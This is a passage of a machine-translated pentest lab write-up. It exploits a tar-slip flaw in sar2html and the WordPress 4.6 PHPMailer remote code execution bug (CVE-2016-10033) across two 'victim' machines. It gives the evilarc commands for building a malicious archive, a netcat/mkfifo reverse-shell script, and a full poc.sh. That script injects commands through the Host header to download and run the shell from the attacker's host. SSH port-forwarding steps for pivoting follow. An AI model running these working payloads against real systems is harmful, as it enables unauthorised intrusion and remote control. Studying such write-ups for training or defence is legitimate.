ir"> tar2slip </strong>漏洞。</p><blockquote class="oa ob oc"><p id="126f" class="jn jo lp jp b jq jr js jt ju jv jw jx od jz ka kb oe kd ke kf of kh ki kj kk ij bi translated"><strong class="jp ir"><em class="iq">sar 2 html</em></strong><em class="iq">易受tar slip攻击，从而导致通过归档提取进行任意文件写入。</em></p></blockquote><p id="ebe1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们试着利用它。</p><p id="c2b9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> 1。首先下载POC生成器工具</strong></p><pre class="lr ls lt lu gt mp mq mr ms aw mt bi"><span id="be5e" class="mu kn iq mq b gy mv mw l mx my">git clone https://github.com/ptoomey3/evilarc.git &amp;&amp; cd evilarc</span></pre><p id="a820" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> 2。运行以下代码</strong></p><pre class="lr ls lt lu gt mp mq mr ms aw mt bi"><span id="e3fd" class="mu kn iq mq b gy mv mw l mx my">echo exploitation test &gt; test.css</span></pre><p id="4134" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> 3。现在生成恶意的tar文件</strong></p><pre class="lr ls lt lu gt mp mq mr ms aw mt bi"><span id="d958" class="mu kn iq mq b gy mv mw l mx my">python2 evilarc.py  -o linux -f pay.tar test.css -p 'static/css' -d 3</span></pre><p id="f1f8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> 4。点击“新建主机”然后上传tar文件“pay . tar”</strong></p><p id="3fc9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> 5。检查文件。</strong></p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div class="gh gi oh"><img src="../Images/91a8505dd498e11efd8529cf15c3c227.png" data-original-src="https://miro.medium.com/v2/resize:fit:1202/format:webp/0*ECAIi7KEyadi_8Cf.png"/></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:使用浏览器</figcaption></figure><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi oi"><img src="../Images/5c0e91c884401f497d4c94483ec3746b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*p-Jbb5Z7_ldtrjaV.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:使用卷曲</figcaption></figure><p id="d58f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们现在已经成功地利用了这个问题。</p><p id="532d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">受害者1受到威胁</strong>。</p><h1 id="6355" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated"><strong class="ak">受害者2 </strong></h1><p id="5e84" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">我们再次开始同样繁琐的<strong class="jp ir"> <em class="lp"> Nmap </em> </strong>扫描。端口80上运行着一个HTTP服务。</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi oj"><img src="../Images/fd22eb68447d091d9bd9a567ff5f6cf9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*SzooK9VshN8rFe_r.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:Nmap扫描(受害者2)</figcaption></figure><p id="b543" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里我们可以看到<strong class="jp ir"> MySQL </strong>服务正在运行。</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi ok"><img src="../Images/91331d3a618b820f99a48f101c251f5e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*sfqjB7y7sLt-39nF.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:Nmap扫描(受害者2)</figcaption></figure><p id="6420" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">目前，我们的目标是HTTP服务。看起来它运行在WordPress cms上。</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi ol"><img src="../Images/f1fe12fba03d3e3f2afff819cf62d64b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*q0T1pdPKUo4_D2_X.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:检查</figcaption></figure><p id="7e67" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果我们没有使用**wp-cli**自动完成安装过程，那么我们应该手动完成。</p><p id="f863" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">要了解更多关于<strong class="jp ir"> WordPress </strong>的这个漏洞，你可以<a class="ae kl" href="https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html" rel="noopener ugc nofollow" target="_blank">点击</a>这里。</p><p id="f8d2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它已经被配置和安装。用户名和密码<strong class="jp ir">分别是“admin”</strong>和<strong class="jp ir">“admin pass”</strong>。</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi om"><img src="../Images/f3c1e0a824bbb0df0fce6254765c7da2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*2JLztxXElrlSNnw3.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:Wordpress安装</figcaption></figure><p id="036f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">保存给定的反向shell有效负载。</p><pre class="lr ls lt lu gt mp mq mr ms aw mt bi"><span id="dcd7" class="mu kn iq mq b gy mv mw l mx my">#!/bin/bash<br/>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 172.16.101.11 1331 &gt;/tmp/f</span></pre><p id="4d1a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">修订版</strong></p><p id="c106" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在保存给定的概念验证。检查是否设置了正确的http_server和target。</p><pre class="lr ls lt lu gt mp mq mr ms aw mt bi"><span id="a4d8" class="mu kn iq mq b gy mv mw l mx my">#!/bin/bash</span><span id="29ac" class="mu kn iq mq b gy on mw l mx my">function prep_host_header() {<br/>      cmd="$1"<br/>      rce_cmd="\${run{$cmd}}";<br/>      rce_cmd="`echo $rce_cmd | sed 's^/^\${substr{0}{1}{\$spool_directory}}^g'`"<br/>      rce_cmd="`echo $rce_cmd | sed 's^ ^\${substr{10}{1}{\$tod_log}}^g'`"<br/>      host_header="target(any -froot@localhost -be $rce_cmd null)"<br/>      return 0<br/>}</span><span id="a367" class="mu kn iq mq b gy on mw l mx my">if [ "$#" -ne 1 ]; then<br/>echo -e "Usage:\n$0 target-wordpress-url\n"<br/>exit 1<br/>fi<br/>target="$1"<br/>http_server="172.16.101.11/rev.sh"</span><span id="8028" class="mu kn iq mq b gy on mw l mx my"># Save payload on the target in /tmp/rev.sh<br/>cmd="/usr/bin/curl $http_server -o /tmp/rev.sh"<br/>prep_host_header "$cmd"<br/>curl -H "Host: $host_header" -s -d 'user_login=admin&amp;wp-submit=Get+New+Password' "$target/wp-login.php?action=lostpassword"<br/>echo -e "\n\e[92m[+]\e[0m Payload sent successfully"</span><span id="b2b8" class="mu kn iq mq b gy on mw l mx my"># get a reverse shell<br/>cmd="/bin/chmod +x /tmp/rev.sh"<br/>prep_host_header "$cmd"<br/>curl -H "Host: $host_header" -s -d 'user_login=admin&amp;wp-submit=Get+New+Password' "$target/wp-login.php?action=lostpassword"<br/>echo -e "\n\e[92m[+]\e[0m Payload sent successfully"</span><span id="2a82" class="mu kn iq mq b gy on mw l mx my">cmd="/bin/sh /tmp/rev.sh"<br/>prep_host_header "$cmd"<br/>curl -H "Host: $host_header" -s -d 'user_login=admin&amp;wp-submit=Get+New+Password' "$target/wp-login.php?action=lostpassword"<br/>echo -e "\n\e[92m[+]\e[0m Payload sent successfully"</span></pre><p id="9674" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> poc.sh </strong></p><h1 id="4d55" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated"><strong class="ak">测试</strong></h1><p id="f7db" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">因此，在执行POC文件之前，我们首先必须确保一切工作正常。从<strong class="jp ir">受害者2 </strong>机到<strong class="jp ir">进攻者</strong>机直接倒壳是不可能的。尽管我们运行了动态端口转发，但它仍然不起作用。</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi oo"><img src="../Images/54727baec2f8335654736519b507fe60.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*3rnNqUlOBHuV4s_w.png"/></div></div></figure><p id="ba1b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> poc.sh </strong>文件将<strong class="jp ir"> rev.sh </strong>从<strong class="jp ir">攻击者</strong>机器下载到<strong class="jp ir">受害者2 </strong>机器。但是它没有与HTTP服务器建立连接。</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi op"><img src="../Images/e14d22c847ef62408a68a09eb330cdc3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*hSNth0BE38DpqEuZ.png"/></div></div></figure><h1 id="2ccc" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated"><strong class="ak">反向外壳</strong></h1><p id="8e1b" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">让我们在这里使用远程端口转发的概念。</p><pre class="lr ls lt lu gt mp mq mr ms aw mt bi"><span id="286f" class="mu kn iq mq b gy mv mw l mx my">ssh -R :80:172.16.100.10:80 root@helper -N -f</span></pre><p id="a917" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这将把来自远程端口(<strong class="jp ir">受害者2 </strong> ) 80的所有流量转发到端口80上的本地机器(<strong class="jp ir">攻击者</strong>)。现在，当我们运行<strong class="jp ir"> poc.sh </strong>文件时，它可以与攻击者机器python HTTP服务器建立连接。让我们应用这个。</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi oq"><img src="../Images/1e44066f793ccde02c4d580e2f79ead2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*2TtWieR4pq4IhMS_.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:下载版本</figcaption></figure><p id="fce3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们现在离拿到反向壳只有一步之遥了。我们再次向远处的港口前进。</p><pre class="lr ls lt lu gt mp mq mr ms aw mt bi"><span id="3da5" class="mu kn iq mq b gy mv mw l mx my"><strong class="mq ir">ssh -R :80:172.16.100.10:80 -R :1331:172.16.100.10:1331 root@helper -N -f</strong></span><span id="85cf" class="mu kn iq mq b gy on mw l mx my"><strong class="mq ir">proxychains4 -q ./poc.sh 172.16.101.21<br/>python3 -m http.server 80<br/>ncat -lvnp 1331</strong></span></pre><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi or"><img src="../Images/e0fa6ee1edde420c45e066c6f2b5a832.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*VhE534yLH6JTSxKf.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:反向外壳</figcaption></figure><p id="c688" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后，我们进入了易受攻击的WordPress机器。</p><p id="d777" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">警告</strong></p><p id="933d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">默认情况下，ssh禁用<strong class="jp ir">网关端口</strong>。它将使任何远程IP只绑定到127.0.0.1: &lt;端口&gt;，并且只允许从服务器主机连接。</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi os"><img src="../Images/988e670ec14a197e91e56511a7cf830d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*0gY2pl4kTa1ErESP.png"/></div></div></figure><p id="17ee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> 1。当网关端口被禁用时</strong></p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi ot"><img src="../Images/6c57c3e3e083f46f74e4cd43cfe7725e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*3JyfxuGz_C28nv6e.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:登机口号码</figcaption></figure><p id="f15d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> 2。网关端口启用时</strong></p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi ou"><img src="../Images/167fb57d07a3733aeb8b0f74f41954a1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*F_QOG9SUWNEuFQ9B.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:网关端口是</figcaption></figure><p id="196e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">谢谢:)</p></div></div>    
</body>
</html>